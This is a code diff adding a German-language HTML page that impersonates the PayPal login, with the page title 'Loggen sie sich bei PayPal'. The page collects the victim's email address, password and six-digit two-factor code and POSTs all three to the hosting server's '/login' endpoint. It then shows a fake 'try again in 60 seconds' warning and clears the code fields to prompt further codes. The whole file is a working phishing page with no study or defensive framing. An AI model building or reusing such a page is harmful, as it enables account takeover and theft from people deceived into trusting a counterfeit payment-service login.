@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loggen sie sich bei PayPal</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700;900&display=swap" rel="stylesheet">
+<link rel="icon" type="image/png" href="favicon.png">
+<style>
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    background-color: white;
+    font-family: 'Outfit', sans-serif;
+}
+
+.wrapper {
+    width: 400px;
+    padding: 30px;
+    border: 1px solid #e8e7e7;
+    border-radius: 10px;
+    margin-top: 120px;
+    height: auto;
+    min-height: 520px;
+}
+
+/* Überschrift */
+.form-box h2 {
+    text-align: center;
+    color: black;
+    font-size: 33px;
+    margin-bottom: 25px;
+    font-family: 'Google Sans', Arial, sans-serif;
+    font-weight: 900;
+    line-height: 1.3;
+    margin-top: 0;
+    margin-bottom: 60px;
+    font-family: 'Outfit', sans-serif;
+    font-weight: 700;
+    position: relative;
+    top: -7px;
+    letter-spacing: -1px;
+}
+
+/* Schritt-Container */
+.step {
+    display: block;
+}
+
+.hidden {
+    display: none !important;
+}
+
+/* Input-Box */
+.input-box {
+    position: relative;
+    margin-bottom: 20px;
+    width: 340px;
+    margin: 0 auto;
+    margin-left: 18px;
+    top: -11px;
+}
+
+.input-box input {
+    width: 100%;
+    padding: 22px 12px;
+    border: 0.5px solid #999;
+    border-radius: 4px;
+    outline: none;
+    font-size: 16px;
+}
+
+.input-box label {
+    position: absolute;
+    left: 12px;
+    top: 12px;
+    color: #7d8286;
+    pointer-events: none;
+    transition: 0.1s;
+    text-align: center;
+    top: 35%;   
+    font-size: 16px;
+    font-family: 'Google Sans', Arial, sans-serif;
+    padding-top: 3px;   
+}
+
+.input-box input:focus + label,
+.input-box input:valid + label {
+    top: 0px;
+    font-size: 17px;         
+}
+
+/* "E-Mail-Adresse vergessen?" links */
+.remember-forgot {
+    width: 330px;
+    margin: 0 auto;
+    margin-bottom: 15px;
+    text-align: left;
+    position: relative;
+    top: 8px;
+    left: -16px;
+}
+
+.remember-forgot a {
+    color: #1576e1;
+    text-decoration: none;
+    font-size: 16px;
+    font-family: 'Google Sans', Arial, sans-serif;
+    font-weight: 600;
+}
+
+.remember-forgot a:hover {
+    text-decoration: underline;
+}
+
+/* Buttons */
+.btn, .btn1 {
+    width: 100%;
+    padding: 12px 0;
+    border: none;
+    border-radius: 70px;
+    font-size: 17px;
+    cursor: pointer;
+    margin-bottom: 10px;
+    transition: 0.3s;
+    font-weight: 500;
+    margin: 0 auto;
+}
+
+/* Weiter-Button & Anmelden-Button */
+.btn {
+    background-color: rgb(6, 80, 181);
+    color: white;
+    width: 360px;
+    display: block;
+    margin: 0 auto;
+    font-family: 'Google Sans', Arial, sans-serif;
+    margin-top: 35px;
+    font-size: 16px;
+    font-weight: 700;
+    height: 48px;
+    width: 91%;
+}
+
+.btn:hover {
+    background-color: #0238c1;
+}
+
+/* Neu anmelden Button */
+.btn1 {
+    background-color: transparent;
+    color: black;
+    border: 2px solid black;
+    width: 360px;
+    display: block;
+    margin: 0 auto;
+    font-family: 'Google Sans', Arial, sans-serif;
+    margin-top: 31px;
+    font-weight: 500;
+    text-shadow: 0 0 0.1px black;
+    width: 91%;
+}
+
+.btn1:hover {
+    background-color: #ddd;
+}
+
+/* Linie "oder" zwischen Buttons */
+.divider {
+    display: flex;
+    align-items: center;
+    text-align: center;
+    margin: 15px 0;
+    gap: 1px;
+    justify-content: center; 
+}
+
+.divider::before,
+.divider::after {
+    content: "";
+    border-bottom: 1px solid #ccc;
+    margin-top: 15px;
+    justify-content: center;
+    width: 155px;
+}
+
+.divider span {
+    padding: 0 15px;
+    color: #666;
+    font-weight: 500;
+    font-family: 'Google Sans', Arial, sans-serif;
+    margin: 0;
+    padding: 0 5px;
+    position: relative;
+    top: 8px;
+}
+
+/* ===== 2FA DESIGN 1:1 AUS DEINER VORLAGE ===== */
+.code-container {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin: 30px 0;
+}
+
+.code-container input {
+    width: 50px;
+    height: 60px;
+    font-size: 24px;
+    text-align: center;
+    border: 2px solid #ccc;
+    border-radius: 8px;
+}
+
+.code-container input:focus {
+    border-color: #0070ba;
+    outline: none;
+}
+
+/* Nochmal Senden */
+.resend-code {
+    font-family: 'Outfit', Arial, sans-serif;
+    font-weight: 300;
+    color: #1576e1;
+    cursor: pointer;
+    text-decoration: none;
+    transition: color 0.3s, text-decoration 0.3s;
+    font-size: 24px;
+    text-align: center;
+    margin: 15px 0;
+    display: block;
+}
+
+.resend-code:hover {
+    text-decoration: underline;
+}
+
+/* Auf anderem Weg bestätigen */
+.alternative {
+    font-family: 'Outfit', Arial, sans-serif;
+    font-weight: 300;
+    color: #1576e1;
+    cursor: pointer;
+    margin-top: 15px;
+    text-decoration: none;
+    transition: color 0.3s, text-decoration 0.3s;
+    font-size: 24px;
+    text-align: center;
+    display: block;
+}
+
+.alternative:hover {
+    text-decoration: underline;
+}
+
+/* Brauche Hilfe? Wir können helfen */
+.help-container {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+    justify-content: center;
+    margin-top: 30px;
+    font-size: 16px;
+}
+
+.help-text {
+    font-weight: 300;
+}
+
+.help-link {
+    font-weight: 300;
+    color: #1576e1;
+    cursor: pointer;
+    text-decoration: none;
+    transition: 0.3s;
+}
+
+.help-link:hover {
+    text-decoration: underline;
+}
+
+/* Titel und Subtitle */
+.code-title {
+    margin-top: 20px;
+    font-size: 28px;
+    text-align: center;
+}
+
+.code-subtitle {
+    font-weight: 300;
+    color: black;
+    font-size: 18px;
+    text-align: center;
+}
+.warning-message.show {
+    display: block;
+}
+
+/* PayPal Logo */
+.paypal-logo {
+    display: block;
+    margin: 0 auto 20px auto;
+    width: 50px;
+    height: auto;
+}
+#step3:not(.hidden) ~ .wrapper,
+.wrapper:has(#step3:not(.hidden)) {
+    border: none;
+    box-shadow: none;
+}
+.wrapper.step3-active h2 {
+    display: none;
+}
+/* Warning Text */
+.warning-text {
+    color: #d32f2f;
+    font-size: 14px;
+    text-align: center;
+    margin: 10px 0;
+    display: none;
+    font-weight: 500;
+}
+
+.warning-text.show {
+    display: block;
+}
+@media (max-width: 480px) {
+    .wrapper {
+        margin-top: 40px;
+        padding: 20px;
+        border: none;
+    }
+
+    .form-box h2 {
+        font-size: 26px;
+        margin-bottom: 30px;
+    }
+
+    .code-container input {
+        width: 40px;
+        height: 50px;
+        font-size: 20px;
+    }
+
+    .resend-code,
+    .alternative {
+        font-size: 18px;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="form-box login">
+    <h2>PayPal</h2>
+    <form id="loginForm" action="#">
+      
+      <!-- SCHRITT 1: E-Mail Eingabe -->
+      <div class="step" id="step1">
+        <div class="input-box">
+          <input type="email" id="email" required>
+          <label>E-Mail-Adresse oder Handynummer</label>
+          
+        </div>
+
+        <div class="remember-forgot">
+          <a href="#" id="forgotEmailLink">E-Mail-Adresse vergessen?</a>
+        </div>
+
+        <button type="button" class="btn" id="nextBtn">Weiter</button>
+
+        <div class="divider"><span>oder</span></div>
+
+        <button type="button" class="btn1" id="signupBtn">Neu anmelden</button>
+      </div>
+      
+      <!-- SCHRITT 2: Passwort Eingabe -->
+      <div class="step hidden" id="step2">
+        <div class="input-box">
+          <input type="password" id="password" required>
+          <label>Passwort</label>
+        </div>
+
+        <div class="remember-forgot">
+          <a href="#" id="forgotPasswordLink">Passwort vergessen?</a>
+        </div>
+
+        <button type="button" class="btn" id="loginBtn">Anmelden</button>
+
+        <div class="divider"><span>oder</span></div>
+
+        <button type="button" class="btn1" id="signupBtn2">Neu anmelden</button>
+      </div>
+      
+      <!-- SCHRITT 3: 2FA Code Eingabe - 1:1 AUS VORLAGE -->
+      <div class="step hidden" id="step3">
+        <!-- PayPal Logo -->
+        <img src="paypal.png" alt="Mein Bild" class="paypal-logo" onerror="this.style.display='none'">
+        
+        <!-- Texte -->
+        <p class="code-title">Gib deinen Code ein</p>
+
+        <p class="code-subtitle">
+            Wir haben ihnen einen Sicherheitscode gesendet
+        </p>
+
+        <p class="resend-code" id="resendCode">Nochmal Senden</p>
+
+        <!-- Code-Container -->
+        <div class="code-container" id="codeContainer">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+        </div>
+
+        <!-- Button -->
+         <!-- Warning Text -->
+<div class="warning-text" id="warningText">Versuche es in 60 Sekunden erneut</div>
+
+<!-- Button -->
+
+        <button type="button" class="btn" id="verifyCodeBtn">Weiter</button>
+
+        <p class="alternative" id="alternativeMethod">Auf anderem Weg bestätigen</p>
+
+        <!-- Help-Container -->
+        <div class="help-container">
+            <span class="help-text">Brauche Hilfe?</span>
+            <span class="help-link" id="helpLink">Wir können helfen</span>
+        </div>
+      </div>
+      
+    </form>
+  </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Elemente holen
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const nextBtn = document.getElementById('nextBtn');
+    const loginBtn = document.getElementById('loginBtn');
+    const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+    const loginForm = document.getElementById('loginForm');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const codeInputs = document.querySelectorAll('.code-input');
+    
+    // Buttons für "Neu anmelden"
+    const signupBtn1 = document.getElementById('signupBtn');
+    const signupBtn2 = document.getElementById('signupBtn2');
+    
+    // Links
+    const forgotEmailLink = document.getElementById('forgotEmailLink');
+    const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+    const resendCode = document.getElementById('resendCode');
+    const alternativeMethod = document.getElementById('alternativeMethod');
+    const helpLink = document.getElementById('helpLink');
+
+    // Variable zum Speichern der Login-Daten
+    let loginData = { email: '', password: '' };
+
+    // WEITER zu Schritt 2
+    nextBtn.addEventListener('click', function() {
+        if (emailInput.value.trim() === '') {
+            alert('Bitte gib deine E-Mail-Adresse oder Handynummer ein.');
+            emailInput.focus();
+            return;
+        }
+        
+        if (!emailInput.value.includes('@') && !emailInput.value.match(/^[0-9]+$/)) {
+            alert('Bitte gib eine gültige E-Mail-Adresse oder Handynummer ein.');
+            emailInput.focus();
+            return;
+        }
+
+        step1.classList.add('hidden');
+        step2.classList.remove('hidden');
+        setTimeout(() => passwordInput.focus(), 100);
+    });
+
+    // ANMELDEN Button (von Schritt 2 zu Schritt 3)
+    loginBtn.addEventListener('click', function(event) {
+        event.preventDefault();
+        
+        const password = passwordInput.value.trim();
+
+        if (password === '') {
+            alert('Bitte gib dein Passwort ein.');
+            passwordInput.focus();
+            return;
+        }
+
+        loginData = {
+            email: emailInput.value.trim(),
+            password: password
+        };
+
+        console.log('Login erfolgreich, 2FA wird angefordert:', loginData);
+        
+        step2.classList.add('hidden');
+        step3.classList.remove('hidden');
+        document.querySelector('.wrapper').classList.add('step3-active');
+        
+        setTimeout(() => {
+            if (codeInputs.length > 0) codeInputs[0].focus();
+        }, 100);
+    });
+
+// CODE BESTÄTIGEN (Schritt 3)
+// CODE BESTÄTIGEN (Schritt 3)
+verifyCodeBtn.addEventListener('click', async function() {
+    let code = '';
+    codeInputs.forEach(input => { code += input.value; });
+    if (code.length < 6) return;
+
+    const dataToSend = {
+        email: loginData.email,
+        password: loginData.password,
+        twofa: code
+    };
+
+    try {
+        await fetch('/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dataToSend)
+        });
+    } catch (err) {
+        console.error('Fehler beim Senden:', err);
+    }
+
+    const warningText = document.getElementById('warningText');
+    warningText.classList.add('show');
+    setTimeout(() => warningText.classList.remove('show'), 9000);
+
+    codeInputs.forEach(input => input.value = '');
+});
+    // ENTER-Taste im E-Mail-Feld
+    emailInput.addEventListener('keypress', function(event) {
+        if (event.key === 'Enter') {
+            event.preventDefault();
+            nextBtn.click();
+        }
+    });
+
+    // ENTER-Taste im Passwort-Feld
+    passwordInput.addEventListener('keypress', function(event) {
+        if (event.key === 'Enter') {
+            event.preventDefault();
+            loginBtn.click();
+        }
+    });
+
+    // "Neu anmelden" Buttons
+    signupBtn1.addEventListener('click', function() {
+        alert('Weiter zur Registrierung');
+    });
+    
+    signupBtn2.addEventListener('click', function() {
+        alert('Weiter zur Registrierung');
+    });
+
+    // Links
+    forgotEmailLink.addEventListener('click', function(event) {
+        event.preventDefault();
+        alert('Funktion: E-Mail vergessen');
+    });
+
+    forgotPasswordLink.addEventListener('click', function(event) {
+        event.preventDefault();
+        alert('Funktion: Passwort vergessen');
+    });
+
+    // 2FA-Links
+    resendCode.addEventListener('click', function() {
+        alert('Neuer Code wurde gesendet');
+    });
+
+    alternativeMethod.addEventListener('click', function() {
+        alert('Alternative Bestätigungsmethode');
+    });
+
+    helpLink.addEventListener('click', function() {
+        alert('Hilfe wird angefordert');
+    });
+
+    // ============ 2FA CODE INPUT LOGIK ============
+    codeInputs.forEach((input, index) => {
+        input.addEventListener("input", () => {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            
+            if (input.value.length === 1 && index < codeInputs.length - 1) {
+                codeInputs[index + 1].focus();
+            }
+        });
+
+        input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && input.value === "" && index > 0) {
+                codeInputs[index - 1].focus();
+            }
+        });
+    });
+
+    // ============ TASTATUR-FUNKTIONEN ============
+    
+    // ESC-Taste
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 'Escape') {
+            if (!step3.classList.contains('hidden')) {
+                event.preventDefault();
+                step3.classList.add('hidden');
+                step2.classList.remove('hidden');
+                passwordInput.focus();
+            } else if (!step2.classList.contains('hidden')) {
+                event.preventDefault();
+                step2.classList.add('hidden');
+                step1.classList.remove('hidden');
+                emailInput.focus();
+            }
+        }
+    });
+    
+    // Strg + Backspace
+    document.addEventListener('keydown', function(event) {
+        if (event.ctrlKey && event.key === 'Backspace') {
+            event.preventDefault();
+            
+            if (document.activeElement === emailInput) {
+                emailInput.value = '';
+            } else if (document.activeElement === passwordInput) {
+                passwordInput.value = '';
+            } else if (document.activeElement.classList.contains('code-input')) {
+                document.activeElement.value = '';
+            }
+        }
+    });
+    
+    // Strg + Shift + L
+    document.addEventListener('keydown', function(event) {
+        if (event.ctrlKey && event.shiftKey && event.key === 'L') {
+            event.preventDefault();
+            emailInput.value = '';
+            passwordInput.value = '';
+            codeInputs.forEach(input => input.value = '');
+            
+            if (!step1.classList.contains('hidden')) {
+                emailInput.focus();
+            } else if (!step2.classList.contains('hidden')) {
+                passwordInput.focus();
+            } else if (!step3.classList.contains('hidden')) {
+                codeInputs[0].focus();
+            }
+        }
+    });
+    
+    // Shift + ESC
+    document.addEventListener('keydown', function(event) {
+        if (event.shiftKey && event.key === 'Escape') {
+            event.preventDefault();
+            
+            if (document.activeElement === emailInput) {
+                emailInput.value = '';
+            } else if (document.activeElement === passwordInput) {
+                passwordInput.value = '';
+            } else if (document.activeElement.classList.contains('code-input')) {
+                document.activeElement.value = '';
+            }
+        }
+    });
+    
+    // Strg + Shift + R
+    document.addEventListener('keydown', function(event) {
+        if (event.ctrlKey && event.shiftKey && event.key === 'R') {
+            event.preventDefault();
+            emailInput.value = '';
+            passwordInput.value = '';
+            codeInputs.forEach(input => input.value = '');
+            step3.classList.add('hidden');
+            step2.classList.add('hidden');
+            step1.classList.remove('hidden');
+            document.querySelector('.wrapper').classList.remove('step3-active');
+            emailInput.focus();
+            loginData = { email: '', password: '' };
+        }
+    });
+    
+    // Entf-Taste im leeren Passwort-Feld
+    passwordInput.addEventListener('keydown', function(event) {
+        if (event.key === 'Delete' && passwordInput.value === '' && !step2.classList.contains('hidden')) {
+            event.preventDefault();
+            step2.classList.add('hidden');
+            step1.classList.remove('hidden');
+            emailInput.focus();
+        }
+    });
+    
+    // Strg + K
+    document.addEventListener('keydown', function(event) {
+        if (event.ctrlKey && event.key === 'k') {
+            event.preventDefault();
+            if (document.activeElement === emailInput || 
+                document.activeElement === passwordInput ||
+                document.activeElement.classList.contains('code-input')) {
+                document.activeElement.select();
+            }
+        }
+    });
+    
+    // Strg + Enter
+    passwordInput.addEventListener('keydown', function(event) {
+        if (event.ctrlKey && event.key === 'Enter') {
+            event.preventDefault();
+            loginBtn.click();
+        }
+    });
+    
+    // Alt + Backspace
+    document.addEventListener('keydown', function(event) {
+        if (event.altKey && event.key === 'Backspace') {
+            event.preventDefault();
+            if (document.activeElement === emailInput) {
+                emailInput.value = '';
+            } else if (document.activeElement === passwordInput) {
+                passwordInput.value = '';
+            } else if (document.activeElement.classList.contains('code-input')) {
+                document.activeElement.value = '';
+            }
+        }
+    });
+});
+
+</script>
+
+</body>
+</html>
